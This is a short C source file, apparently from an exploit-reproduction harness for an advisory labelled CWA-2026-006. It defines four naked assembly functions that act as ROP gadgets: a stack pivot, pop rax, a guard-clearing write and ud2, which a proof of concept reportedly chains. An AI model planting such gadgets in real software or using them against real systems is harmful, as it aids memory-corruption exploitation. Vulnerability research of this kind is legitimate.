// gadgets.c — CWA-2026-006 harness ROP gadget farm (C symbols, kept in ELF symtab).
// The verified PoC uses these exact primitive shapes; a given Go/SDK build may not
// contain the byte sequences. naked => body is exactly the asm.
__attribute__((naked, used, noinline)) void gadget_pivot(void) {
    __asm__ volatile("addq $0x150, %rsp\n\tpopq %rbp\n\tret");
}
__attribute__((naked, used, noinline)) void gadget_poprax(void) {
    __asm__ volatile("popq %rax\n\tret");
}
__attribute__((naked, used, noinline)) void gadget_guardclear(void) {
    __asm__ volatile("xorps %xmm15, %xmm15\n\tmovups %xmm15, 0x10(%rax)\n\tret");
}
__attribute__((naked, used, noinline)) void gadget_ud2(void) {
    __asm__ volatile("ud2");
}
